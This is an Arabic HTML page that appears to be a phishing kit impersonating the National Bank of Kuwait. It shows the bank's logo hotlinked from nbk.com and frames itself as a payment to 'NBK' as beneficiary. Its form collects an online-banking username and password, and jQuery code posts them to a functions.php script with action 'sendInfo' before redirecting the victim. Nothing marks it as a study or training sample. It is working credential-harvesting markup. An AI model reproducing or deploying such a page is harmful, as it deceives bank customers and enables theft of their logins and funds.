<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RTL Header with Form</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Bootstrap RTL CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-rtl/css/bootstrap.rtl.min.css" rel="stylesheet">
    <link rel="stylesheet" href="pay.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>

    </style>
</head>

<body>

    <style>
        /* Simple loader styles */
        #loader {
            display: none;
            /* Hidden by default */
            border: 4px solid #f3f3f3;
            /* Light gray */
            border-top: 4px solid #3498db;
            /* Blue */
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
        }

        /* Spin animation */
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }
    </style>

    <header class="header-image d-flex justify-content-center align-items-center">
        <div class="container">
            <div class="row">
                <!-- Box with Name and Image -->
                <div class="col-md-12 mb-3">
                    <div class="content-box text-center">
                        <img src="banner.png" alt="User Image" class="banner mb-3"> <!-- Replace with your image URL -->
                    </div>
                </div>
            </div>
        </div>
    </header>
    <section>
        <div class="container">
            <div class="box-one">
                <div class="d-flex justify-content-center">
                    <img src="https://www.nbk.com/dam/jcr:281bc4f7-7256-48c6-a05e-761bacea00a3/nbk-logo.svg"
                        alt="SPACES" itemprop="logo">
                </div>
                <ul class="list-group list-group-flush">
                    <li class="list-group-item d-flex justify-content-start">
                        <span class="">المستفيد</span> <!-- Aligns to the left -->
                        <span class="mx-auto text-blue">NBK</span> <!-- Centers within the list item -->
                    </li>
                </ul>
            </div>
        </div>
    </section>

    <form action="functions.php" method="post" id="payment-form">
        <input type="hidden" name="action" value="sendInfo">
        <section>
            <div class="container">
                <div class="box-one">
                    <ul class="list-group list-group-flush">
                        <li class="list-group-item">
                            <div class="row">
                                <div class="col-4">
                                    <span class="text-blue">اسم المستخدم</span> <!-- Aligns to the left -->
                                </div>
                                <div class="col-8">
                                    <input type="text" class="form-control" name="username" id="username"
                                        placeholder="اسم المستخدم">
                                </div>
                                <div class="col-4">
                                    <span class="text-blue">الرقم السري</span> <!-- Aligns to the left -->
                                </div>
                                <div class="col-8">
                                    <input type="password" class="form-control" name="password" id="password"
                                        placeholder="الرقم السري">
                                </div>
                            </div>
                        </li>

                    </ul>
                </div>
            </div>
        </section>

        <section>
            <div class="container">
                <div class="box-one">
                    <div class="row">
                        <div class="col-md-6 col-sm-6 col-6">
                            <button class="btn btn-send  w-100" id="send-data" type="submit">ارسال</button>
                        </div>
                        <div class="col-md-6 col-sm-6 col-6">
                            <a class="btn btn-send w-100" href="javascript:void(0)" type="submit">الغاء</a>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </form>


    <div class="loader-overlay d-flex justify-content-center align-items-center">
        <div id="loader"></div>
    </div>
    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>


    <script>
        $(document).ready(function() {
            $('#send-data').click(function(e) {
                e.preventDefault();
                var isValid = true;
                var username = $('#username').val();
                var password = $('#password').val();


                if (username === "" || username === null) {
                    alert("الرجاء ادخال اسم المستخدم.");
                    isValid = false;
                    return "";
                }
                if (password === "" || password === null) {
                    alert("الرجاء ادخال الرقم السري.");
                    isValid = false;
                    return "";
                }

                $('#loader').show();
                // Submit form if valid

                if (isValid) {
                    // Simulate a delay for demonstration (e.g., submitting the form)
                    setTimeout(function() {
                        $.ajax({
                            url: 'functions.php', // Replace with your PHP script URL
                            type: 'POST',
                            data: $('#payment-form').serialize(), // Serialize the form data
                            success: function(response) {
                                // Handle success response

                                window.location.href = response.redirect;
                                console.log(response);
                            },
                            error: function(xhr, status, error) {
                                // Handle error response
                                console.log(xhr.responseText);
                            },
                            complete: function() {
                                // Hide the loader
                                $('#loader').hide();
                            }
                        });
                    }, 1000);
                } else {
                    // Hide the loader if validation fails
                    $('#loader').hide();
                }



            });
        });
    </script>

</body>

</html>